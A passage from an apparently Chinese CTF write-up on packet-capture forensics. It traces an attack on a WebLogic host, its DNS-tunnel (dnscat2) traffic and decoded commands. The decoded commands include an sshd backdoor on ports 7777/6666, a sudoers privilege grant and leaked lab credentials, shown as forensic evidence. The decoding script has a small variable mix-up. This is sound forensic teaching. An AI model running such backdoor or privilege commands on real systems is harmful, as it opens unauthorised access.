class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大概看了一哈, CONNECT 就是开启一个 socket, FORWARD 就是往 socket 里面写数据, READ、DISCONNECT 自然就是读数据和断开链接. 在 <code>data2_challage_00004_20180227145305</code> 里面可以看到 CONNECT 了 <code>192.168.1.30</code> 的 <code>7001</code> 端口, 7001 是 webLogic 的端口, 之前出过一个洞, 这时估计攻击者是想用这个洞拿 shell, 由于这些包是包括 <code>192.168.1.30</code> 的流量的, 所以我们之间取这台被攻击机的流量就行了. 可以用 <code>tshark</code> 提取, 翻了一下前面都是对我们来说没用的拿 shell 的过程, 重要的是最后的 pwd 和 ifconfig, 这样就可以秒掉之前的两道题(当前目录和 MAC 地址), 再将 <code>data2_challage_00005_201802271501121.pcap</code> 也提取一下, 就可以拿到添加的用户名和密码, 就是 <code>mailer:test</code>.</p>
<h3 id="0x09-目标-2-的后台的用户名和密码是多少"><a href="#0x09-目标-2-的后台的用户名和密码是多少" class="headerlink" title="0x09 目标 2 的后台的用户名和密码是多少"></a>0x09 目标 2 的后台的用户名和密码是多少</h3><p>这个挺简单, 在 <code>data2_challage_00007_20180227151621</code> 里面, 直接过滤 http 就行, 得到 <code>webadmin:web_pass</code></p>
<h3 id="0x0A-黑客什么时候上传了后门程序包"><a href="#0x0A-黑客什么时候上传了后门程序包" class="headerlink" title="0x0A 黑客什么时候上传了后门程序包"></a>0x0A 黑客什么时候上传了后门程序包</h3><p>观察 <code>data2_challage_00008_20180227152407</code> , 可以看到 index 就是马, 所以 <code>data2_challage_00007_20180227151621</code> 里面上传的 <code>index.war</code> 就是马的压缩文件, 把这个包的上传时间提交上去就行. 得到 <code>15:23:49.475745</code>, 注意删掉后面的 3 个零, 真的有毒.</p>
<h3 id="0x0B-目标-2-上-webshell-的后台密码"><a href="#0x0B-目标-2-上-webshell-的后台密码" class="headerlink" title="0x0B 目标 2 上 webshell 的后台密码"></a>0x0B 目标 2 上 webshell 的后台密码</h3><p>同第 9 题, 挺简单, 在 <code>data2_challage_00008_20180227152407</code> 里面, 得到 <code>admin</code></p>
<h3 id="0x0C-在目标-1-上的-tmp-fun-文件的内容是什么"><a href="#0x0C-在目标-1-上的-tmp-fun-文件的内容是什么" class="headerlink" title="0x0C 在目标 1 上的 /tmp/fun 文件的内容是什么"></a>0x0C 在目标 1 上的 /tmp/fun 文件的内容是什么</h3><p>从这道题开始我真的无力吐槽 <em>(:з」∠)</em>, 因为跳的真的太快. 虽然在第 9<del>13 数据包里面确实可以看到有上传 <code>dnscat</code> 这种 dns 隧道, 但是真的很难想到这就要用上, 毕竟从 14</del>15 里面才有 dns 通讯的痕迹, 我还以为在前面有漏掉的内容 (逃 导致卡了蛮久的. 在这直接跳了 5 个数据包可还行, 至少加个题目问下 dns 隧道用了什么软件嘛 233. 不说这个了, 回到题目, 可以在 github 查到 dnscat 协议的结构, 以及有人做的分析, <a href="https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md</a>,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(uint16_t) packet_id</span><br><span class="line">(uint8_t) message_type [0x01]</span><br><span class="line">(uint16_t) session_id</span><br><span class="line">(uint16_t) seq</span><br><span class="line">(uint16_t) ack</span><br><span class="line">(byte[]) data</span><br></pre></td></tr></table></figure>

<p>4 + 2 + 4 + 4 + 4 = 18, 所以我们从第 19 位开始取就行了, 先用 tshark 将 dns.qry.name 全部取出来, 然后写个小脚本提取一下就行.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = open(<span class="string">"temp"</span>).read().split(<span class="string">"\n"</span>)</span><br><span class="line">result = open(<span class="string">"result"</span>, <span class="string">"wb"</span>)</span><br><span class="line">s = set()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    s.add(line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> line <span class="keyword">and</span> line.find(<span class="string">"dnscat"</span>) != <span class="number">-1</span>:</span><br><span class="line">        line = line[<span class="number">7</span>:].replace(<span class="string">"."</span>, <span class="string">""</span>) <span class="comment">#删掉 dnscat 和 .</span></span><br><span class="line">        line = line[<span class="number">18</span>:].upper() <span class="comment">#取得有效位</span></span><br><span class="line">        line = base64.b16decode(line) <span class="comment">#还原成二进制</span></span><br><span class="line">        f2.write(line)</span><br></pre></td></tr></table></figure>

<p>从 <code>data2_challage_00014_20180227162610.pcap</code> 提取的全是乱码, 并没有什么用, 最后 3 题都在 <code>data2_challage_00015_20180227165116</code>, <code>hexdump</code> 后就可以看到最后三题的答案了.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000  63 6f 6d 6d 61 6e 64 20  28 6c 6f 63 61 6c 68 6f  |command (localho|</span><br><span class="line">00000010  73 74 2e 6c 6f 63 61 6c  64 6f 6d 61 69 6e 29 00  |st.localdomain).|</span><br><span class="line">00000020  6c 6e 20 2d 73 66 20 2f  75 73 72 2f 73 62 69 6e  |ln -sf &#x2F;usr&#x2F;sbin|</span><br><span class="line">00000030  2f 73 73 68 64 20 2f 74  6d 70 2f 63 68 73 68 3b  |&#x2F;sshd &#x2F;tmp&#x2F;chsh;|</span><br><span class="line">00000040  20 2f 74 6d 70 2f 63 68  73 68 20 2d 6f 50 6f 72  | &#x2F;tmp&#x2F;chsh -oPor|</span><br><span class="line">00000050  74 3d 37 37 37 37 20 28  6c 6f 63 61 6c 68 6f 73  |t&#x3D;7777 (localhos|</span><br><span class="line">00000060  74 2e 6c 6f 63 61 6c 64  6f 6d 61 69 6e 29 00 0a  |t.localdomain)..|</span><br><span class="line">00000070  0c 10 eb ff 0e 46 2a be  32 2d 94 2d 4a 80 a5 b9  |.....F*.2-.-J...|</span><br><span class="line">00000080  1f b5 69 ee 85 52 e3 3e  2a 27 c1 8a 98 98 ac 72  |..i..R.&gt;*&#39;.....r|</span><br><span class="line">00000090  da fe b6 aa 21 20 10 01  b9 fb ad 58 45 2e d6 60  |....! .....XE..&#96;|</span><br><span class="line">000000a0  ed e3 cd da 22 36 20 ce  13 83 e7 8d d2 f8 d9 33  |....&quot;6 ........3|</span><br><span class="line">000000b0  3a c9 04 c7 ef bc cd 54  01 46 bc 5b d0 1a 47 85  |:......T.F.[..G.|</span><br><span class="line">000000c0  f0 83 5e b5 31 c1 0f 1b  3b 55 66 c2 c3 4d e1 72  |..^.1...;Uf..M.r|</span><br><span class="line">000000d0  0b 46 59 28 b9 93 9b c0  a9 54 66 01 2b 71 e4 cb  |.FY(.....Tf.+q..|</span><br><span class="line">000000e0  f5 4a 53 df f6 a2 7d 32  08 ca f9 ea 98 c9 16 6c  |.JS...&#125;2.......l|</span><br><span class="line">000000f0  6e 20 2d 73 66 20 2f 75  73 72 2f 73 62 69 6e 2f  |n -sf &#x2F;usr&#x2F;sbin&#x2F;|</span><br><span class="line">00000100  73 73 68 64 20 2f 74 6d  70 2f 63 68 73 68 3b 20  |sshd &#x2F;tmp&#x2F;chsh; |</span><br><span class="line">00000110  2f 74 6d 70 2f 63 68 73  68 20 2d 6f 50 6f 72 74  |&#x2F;tmp&#x2F;chsh -oPort|</span><br><span class="line">00000120  3d 36 36 36 36 3b 20 28  6c 6f 63 61 6c 68 6f 73  |&#x3D;6666; (localhos|</span><br><span class="line">00000130  74 2e 6c 6f 63 61 6c 64  6f 6d 61 69 6e 29 00 00  |t.localdomain)..|</span><br><span class="line">00000140  00 00 06 80 01 00 01 fb  1b 00 00 00 06 80 01 00  |................|</span><br><span class="line">00000150  02 96 dd 65 63 68 6f 20  27 6d 61 69 6c 65 72 20  |...echo &#39;mailer |</span><br><span class="line">00000160  20 20 20 41 4c 4c 3d 28  41 4c 4c 29 20 20 20 20  |   ALL&#x3D;(ALL)    |</span><br><span class="line">00000170  41 4c 4c 27 20 20 3e 3e  20 20 2f 65 74 63 2f 73  |ALL&#39;  &gt;&gt;  &#x2F;etc&#x2F;s|</span><br><span class="line">00000180  75 64 6f 65 72 73 20 28  6c 6f 63 61 6c 68 6f 73  |udoers (localhos|</span><br><span class="line">00000190  74 2e 6c 6f 63 61 6c 64  6f 6d 61 69 6e 29 00 00  |t.localdomain)..|</span><br><span class="line">000001a0  00 00 06 80 01 00 02 4c  f2 2f 65 74 63 2f 73 73  |.......L.&#x2F;etc&#x2F;ss|</span><br><span class="line">000001b0  68 2f 73 73 68 64 5f 63  6f 6e 66 69 67 3a 20 50  |h&#x2F;sshd_config: P|</span><br><span class="line">000001c0  65 72 6d 69 73 73 69 6f  6e 20 64 65 6e 69 65 64  |ermission denied|</span><br><span class="line">000001d0  0a a7 07 00 03 d4 db f5  93 63 6f 6d 6d 61 6e 64  |.........command|</span><br><span class="line">000001e0  20 28 6c 6f 63 61 6c 68  6f 73 74 2e 6c 6f 63 61  | (localhost.loca|</span><br><span class="line">000001f0  6c 64 6f 6d 61 69 6e 29  00 63 6f 6d 6d 61 6e 64  |ldomain).command|</span><br><span class="line">00000200  20 28 6c 6f 63 61 6c 68  6f 73 74 2e 6c 6f 63 61  | (localhost.loca|</span><br><span class="line">00000210  6c 64 6f 6d 61 69 6e 29  00 00 00 00 06 80 02 00  |ldomain)........|</span><br><span class="line">00000220  02 f3 9c 26 0a 00 04 71  1a b7 28 63 6f 6d 6d 61  |...&amp;...q..(comma|</span><br><span class="line">00000230  6e 64 20 28 6c 6f 63 61  6c 68 6f 73 74 2e 6c 6f  |nd (localhost.lo|</span><br><span class="line">00000240  63 61 6c 64 6f 6d 61 69  6e 29 00 63 6f 6d 6d 61  |caldomain).comma|</span><br><span class="line">00000250  6e 64 20 28 6c 6f 63 61  6c 68 6f 73 74 2e 6c 6f  |nd (localhost.lo|</span><br><span class="line">00000260  63 61 6c 64 6f 6d 61 69  6e 29 00 61 6d 20 63 6c  |caldomain).am cl|</span><br><span class="line">00000270  6f 73 65 64 00 70 c3 00  00 c4 d2 dd 06 ab ba 87  |osed.p..........|</span><br><span class="line">00000280  31 e4 a2 01 cc 5b 8e a2  d9 fc 65 02 76 f9 ce 10  |1....[....e.v...|</span><br><span class="line">00000290  d2 37 a7 4d 1d 0a 3e 1c  78 36 63 72 cc 33 3a c9  |.7.M..&gt;.x6cr.3:.|</span><br><span class="line">000002a0  04 c7 ef bc cd 54 01 46  bc 5b d0 1a 47 85 f0 83  |.....T.F.[..G...|</span><br><span class="line">000002b0  5e b5 31 c1 0f 1b 3b 55  66 c2 c3 4d e1 72 0b 46  |^.1...;Uf..M.r.F|</span><br><span class="line">000002c0  59 28 b9 93 9b c0 a9 54  66 01 2b 71 e4 cb f5 4a  |Y(.....Tf.+q...J|</span><br><span class="line">000002d0  53 df f6 a2 7d 32 08 ca  f9 ea 98 c9 16 64 e0 00  |S...&#125;2.......d..|</span><br><span class="line">000002e0  02 74 2e f7 10 00 00 00  06 80 01 00 02 05 d0 65  |.t.............e|</span><br><span class="line">000002f0  63 68 6f 20 68 65 6c 6c  6f 77 6f 72 6c 64 20 3e  |cho helloworld &gt;|</span><br><span class="line">00000300  20 2f 74 6d 70 2f 66 75  6e 20 28 63 6c 6f 75 64  | &#x2F;tmp&#x2F;fun (cloud|</span><br><span class="line">00000310  65 29 00 63 6f 6d 6d 61  6e 64 20 28 6c 6f 63 61  |e).command (loca|</span><br><span class="line">00000320  6c 68 6f 73 74 2e 6c 6f  63 61 6c 64 6f 6d 61 69  |lhost.localdomai|</span><br><span class="line">00000330  6e 29 00 9a 4a 00 01 de  7b a2 29 73 68 20 28 6c  |n)..J...&#123;.)sh (l|</span><br><span class="line">00000340  6f 63 61 6c 68 6f 73 74  2e 6c 6f 63 61 6c 64 6f  |ocalhost.localdo|</span><br><span class="line">00000350  6d 61 69 6e 29 00 0a 0c  10 eb ff 0e 46 2a be 32  |main).......F*.2|</span><br><span class="line">00000360  2d 94 2d 4a 80 a5 b9 1f  b5 69 ee 85 52 e3 3e 2a  |-.-J.....i..R.&gt;*|</span><br><span class="line">00000370  27 c1 8a 98 98 ac 72 da  fe b6 aa 21 20 10 01 b9  |&#39;.....r....! ...|</span><br><span class="line">00000380  fb ad 58 45 2e d6 60 ed  e3 cd da 22 36 20 ce 13  |..XE..&#96;....&quot;6 ..|</span><br><span class="line">00000390  83 e7 8d d2 f8 d9                                 |......|</span><br></pre></td></tr></table></figure>

<p>可以看到 <code>echo helloworld &gt; /tmp/fun</code>, <code>helloworld</code> 即是第 12 题答案.</p>
<h3 id="0x0D-黑客什么时候将目标-2-上添加的用户加入到-sudo-组中"><a href="#0x0D-黑客什么时候将目标-2-上添加的用户加入到-sudo-组中" class="headerlink" title="0x0D 黑客什么时候将目标 2 上添加的用户加入到 sudo 组中"></a>0x0D 黑客什么时候将目标 2 上添加的用户加入到 sudo 组中</h3><p><code>echo &#39;mailer ALL=(ALL) ALL&#39; &gt;&gt; /etc/sudoers</code> 就是了, 重新换成 16 进制, 数据包里面搜一下就可以得到时间 <code>17:19:24.285557</code>, 注意这里要用攻击机回应的 dns 包的时间.</p>
<h3 id="0x0E-在目标-2-上黑客执行某命令开启了一个端口作为后门-这条命令是什么"><a href="#0x0E-在目标-2-上黑客执行某命令开启了一个端口作为后门-这条命令是什么" class="headerlink" title="0x0E 在目标 2 上黑客执行某命令开启了一个端口作为后门, 这条命令是什么"></a>0x0E 在目标 2 上黑客执行某命令开启了一个端口作为后门, 这条命令是什么</h3><p>很明显就是这个 <code>ln -sf /usr/sbin/sshd /tmp/chsh; /tmp/chsh -oPort=7777</code>, 但这建了个软链, 该用 <code>sshd</code> 呢还是 <code>chsh</code> 还是 <code>/usr/bin/sshd</code> 啥的带绝对路径的, 以及要不要带 <code>-oPort=7777</code> 这个参数呢 (甚至后面还有个 <code>-oPort=6666</code>), 后来小丢小姐姐提示直接一起复制上去就行了, 这个时候想起来有 <code>;</code> , 严格意义上来说这确实是<code>一</code>条命令…. 我的表情是这样的<br><img src="https://i.loli.net/2019/03/08/5c8276282a140.jpeg" alt=""><br>这就完成了全部题目, 题目还是蛮不错的, 至少还得自己写点程序, 不是只靠脚本就能完成, 就是中间突然跳了太多了…(碎碎念</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>audit</tag>
      </tags>
  </entry>
</search>
